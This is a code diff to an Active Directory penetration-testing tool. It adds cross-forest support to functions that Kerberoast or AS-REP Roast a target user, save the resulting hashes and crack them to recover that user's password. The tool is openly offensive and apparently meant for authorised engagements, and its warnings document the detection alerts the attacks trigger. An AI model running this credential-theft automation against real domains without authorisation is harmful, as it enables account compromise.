@@ -24,12 +24,87 @@ from adscan_internal import (
 )
 from adscan_internal.cli.ace_step_execution import set_last_execution_outcome
 from adscan_internal.cli import cracking as cracking_cli
+from adscan_internal.models.domain import resolve_dc_ip
 from adscan_internal.path_utils import get_adscan_home
 from adscan_internal.rich_output import mark_sensitive
 from adscan_internal.services import EnumerationService
 from adscan_internal.services.attack_graph_service import upsert_roast_entry_edge
 from adscan_internal.workspaces import domain_relpath, domain_subpath
 from adscan_core.rich_output import print_exception
+
+
+@dataclass(frozen=True)
+class _RoastRealm:
+    """Resolved realm split for a (possibly cross-forest) roast.
+
+    ``auth_domain`` is the realm the authenticating credential belongs to; it is
+    the ``domain`` positional the caller already passes. ``roast_domain`` is the
+    realm the TARGET user actually lives in (where the SPN / DONT_REQUIRE_PREAUTH
+    account is, and where its recovered credential belongs). ``pdc`` is the KDC of
+    ``roast_domain`` — resolved via the ``resolve_dc_ip`` SSOT, never a hand-rolled
+    ``.get("pdc")`` chain. In the common single-domain case the two realms coincide
+    and ``pdc`` is the auth domain's KDC, byte-identical to the prior behaviour.
+    """
+
+    auth_domain: str
+    roast_domain: str
+    pdc: str
+    cross_realm: bool
+
+
+def _resolve_roast_realm(
+    shell: Any, *, auth_domain: str, target_domain: str | None
+) -> _RoastRealm | None:
+    """Resolve where a roast should authenticate vs where it should run.
+
+    Returns ``None`` when a cross-forest target domain was requested but ADscan
+    never collected it (no ``domains_data`` entry) or its DC cannot be resolved —
+    the caller must then record an honest "target domain not collected" outcome
+    rather than silently roasting the wrong (auth) domain.
+    """
+    auth_domain = str(auth_domain or "").strip()
+    requested = str(target_domain or "").strip()
+    domains_data = getattr(shell, "domains_data", None)
+    if not isinstance(domains_data, dict):
+        domains_data = {}
+
+    # Same-domain (default / single-forest): byte-identical to the prior direct
+    # ``domains_data[domain]["pdc"]`` read (resolve_dc_ip's first fallback is pdc).
+    if not requested or requested.lower() == auth_domain.lower():
+        auth_data = domains_data.get(auth_domain)
+        pdc = (
+            resolve_dc_ip(auth_data) if isinstance(auth_data, dict) else None
+        ) or ""
+        return _RoastRealm(
+            auth_domain=auth_domain,
+            roast_domain=auth_domain,
+            pdc=str(pdc),
+            cross_realm=False,
+        )
+
+    # Cross-forest: the target user's realm must have been collected AND its DC
+    # must resolve, or we cannot honestly roast it.
+    target_data = None
+    for candidate_domain, candidate_data in domains_data.items():
+        if (
+            isinstance(candidate_domain, str)
+            and candidate_domain.lower() == requested.lower()
+            and isinstance(candidate_data, dict)
+        ):
+            requested = candidate_domain  # preserve stored casing
+            target_data = candidate_data
+            break
+    if target_data is None:
+        return None
+    target_pdc = str(resolve_dc_ip(target_data) or "").strip()
+    if not target_pdc:
+        return None
+    return _RoastRealm(
+        auth_domain=auth_domain,
+        roast_domain=requested,
+        pdc=target_pdc,
+        cross_realm=True,
+    )
 
 
 @dataclass(frozen=True)
@@ -260,9 +335,22 @@ def run_kerberoast_for_user(
     domain: str,
     *,
     target_user: str,
+    target_domain: str | None = None,
     wordlists_dir: str | None = None,
 ) -> bool:
     """Run Kerberoasting for a single target user and crack the result.
+
+    Args:
+        shell: The active pentest shell.
+        domain: The AUTH domain — the realm the authenticating credential belongs
+            to. In a same-forest path this is also where the target user lives.
+        target_user: sAMAccountName of the user to roast.
+        target_domain: The realm the TARGET user actually lives in, for
+            cross-forest attack paths where the target lives in a trusted domain
+            different from ``domain``. Defaults to ``domain`` (same-forest), which
+            is byte-identical to the prior behaviour. When it differs, the roast
+            runs against the target realm's DC while authenticating with the
+            ``domain`` credential over the trust.
 
     Returns:
         True if the target credential was recovered (stored), False otherwise.
@@ -271,6 +359,17 @@ def run_kerberoast_for_user(
     if not target_user:
         print_warning("Kerberoast target user is missing.")
         return False
+
+    realm = _resolve_roast_realm(shell, auth_domain=domain, target_domain=target_domain)
+    if realm is None:
+        marked_target_domain = mark_sensitive(str(target_domain or ""), "domain")
+        print_warning(
+            f"Cannot Kerberoast {mark_sensitive(target_user, 'user')}: its domain "
+            f"{marked_target_domain} was not collected (no DC resolved). "
+            "Cross-domain roast not attempted."
+        )
+        return False
+    roast_domain = realm.roast_domain
 
     auth = _select_any_domain_credential(shell, domain)
     if not auth:
@@ -285,16 +384,23 @@ def run_kerberoast_for_user(
         "Microsoft Defender for Identity generates alert 'Kerberoasting attack suspected' "
         "(Event 4769, Ticket Encryption Type 0x17). Document as expected engagement noise."
     )
+    if realm.cross_realm:
+        print_info_debug(
+            "[roasting-exec] cross-forest Kerberoast: "
+            f"auth_domain={mark_sensitive(domain, 'domain')} "
+            f"target_domain={mark_sensitive(roast_domain, 'domain')} "
+            f"kdc={mark_sensitive(realm.pdc, 'ip')}"
+        )
 
     upsert_roast_entry_edge(
         shell,
-        domain,
+        roast_domain,
         roast_type="kerberoast",
         username=target_user,
         status="discovered",
     )
 
-    _, cracking_abs_dir = _ensure_cracking_dir(shell, domain)
+    _, cracking_abs_dir = _ensure_cracking_dir(shell, roast_domain)
     safe_suffix = target_user.replace("/", "_").replace("\\", "_").replace(" ", "_")
     hashes_file_abs = str(Path(cracking_abs_dir) / f"hashes.kerberoast.{safe_suffix}")
     usersfile_abs = str(Path(cracking_abs_dir) / f"users.kerberoast.{safe_suffix}.txt")
@@ -311,8 +417,8 @@ def run_kerberoast_for_user(
 
     try:
         enum_service.kerberos.kerberoast(
-            domain=domain,
-            pdc=shell.domains_data[domain]["pdc"],
+            domain=roast_domain,
+            pdc=realm.pdc,
             username=auth.username,
             password=None if auth.is_hash else auth.secret,
             hashes=auth.secret if auth.is_hash else None,
@@ -361,14 +467,16 @@ def run_kerberoast_for_user(
     cracking_cli.run_cracking(
         shell,
         hash_type="kerberoast",
-        domain=domain,
+        domain=roast_domain,
         hash_file=hashes_file_for_cracking,
         wordlists_dir=wordlists_dir,
         failed=False,
     )
-    recovered = _has_domain_credential(shell, domain, target_user)
+    recovered = _has_domain_credential(shell, roast_domain, target_user)
     if recovered:
-        _record_user_credential_outcome(shell, domain=domain, target_user=target_user)
+        _record_user_credential_outcome(
+            shell, domain=roast_domain, target_user=target_user
+        )
     return recovered
 
 
@@ -377,9 +485,21 @@ def run_asreproast_for_user(
     domain: str,
     *,
     target_user: str,
+    target_domain: str | None = None,
     wordlists_dir: str | None = None,
 ) -> bool:
     """Run ASREPRoasting for a single target user and crack the result.
+
+    Args:
+        shell: The active pentest shell.
+        domain: The AUTH domain — the realm the operation runs from. In a
+            same-forest path this is also where the target user lives.
+        target_user: sAMAccountName of the user to roast.
+        target_domain: The realm the TARGET user actually lives in, for
+            cross-forest attack paths where the target lives in a trusted domain
+            different from ``domain``. Defaults to ``domain`` (same-forest), which
+            is byte-identical to the prior behaviour. When it differs, the AS-REQ
+            is issued against the target realm's DC.
 
     Returns:
         True if the target credential was recovered (stored), False otherwise.
@@ -389,21 +509,39 @@ def run_asreproast_for_user(
         print_warning("ASREPRoast target user is missing.")
         return False
 
+    realm = _resolve_roast_realm(shell, auth_domain=domain, target_domain=target_domain)
+    if realm is None:
+        marked_target_domain = mark_sensitive(str(target_domain or ""), "domain")
+        print_warning(
+            f"Cannot ASREPRoast {mark_sensitive(target_user, 'user')}: its domain "
+            f"{marked_target_domain} was not collected (no DC resolved). "
+            "Cross-domain roast not attempted."
+        )
+        return False
+    roast_domain = realm.roast_domain
+
     print_warning(
         "AS-REP Roasting requests pre-auth disabled TGTs. "
         "Microsoft Defender for Identity generates alert 'AS-REP Roasting attack suspected' "
         "(Event 4768, Pre-Authentication Type 0). Document as expected engagement noise."
     )
+    if realm.cross_realm:
+        print_info_debug(
+            "[roasting-exec] cross-forest ASREPRoast: "
+            f"auth_domain={mark_sensitive(domain, 'domain')} "
+            f"target_domain={mark_sensitive(roast_domain, 'domain')} "
+            f"kdc={mark_sensitive(realm.pdc, 'ip')}"
+        )
 
     upsert_roast_entry_edge(
         shell,
-        domain,
+        roast_domain,
         roast_type="asreproast",
         username=target_user,
         status="discovered",
     )
 
-    _, cracking_abs_dir = _ensure_cracking_dir(shell, domain)
+    _, cracking_abs_dir = _ensure_cracking_dir(shell, roast_domain)
     safe_suffix = target_user.replace("/", "_").replace("\\", "_").replace(" ", "_")
     hashes_file_abs = str(Path(cracking_abs_dir) / f"hashes.asreproast.{safe_suffix}")
     usersfile_abs = str(Path(cracking_abs_dir) / f"users.asreproast.{safe_suffix}.txt")
@@ -420,8 +558,8 @@ def run_asreproast_for_user(
 
     try:
         enum_service.kerberos.asreproast(
-            domain=domain,
-            pdc=shell.domains_data[domain]["pdc"],
+            domain=roast_domain,
+            pdc=realm.pdc,
             usersfile=Path(usersfile_abs),
             output_file=Path(hashes_file_abs),
             workspace_dir=_resolve_workspace_dir(shell),
@@ -465,12 +603,14 @@ def run_asreproast_for_user(
     cracking_cli.run_cracking(
         shell,
         hash_type="asreproast",
-        domain=domain,
+        domain=roast_domain,
         hash_file=hashes_file_for_cracking,
         wordlists_dir=wordlists_dir,
         failed=False,
     )
-    recovered = _has_domain_credential(shell, domain, target_user)
+    recovered = _has_domain_credential(shell, roast_domain, target_user)
     if recovered:
-        _record_user_credential_outcome(shell, domain=domain, target_user=target_user)
+        _record_user_credential_outcome(
+            shell, domain=roast_domain, target_user=target_user
+        )
     return recovered
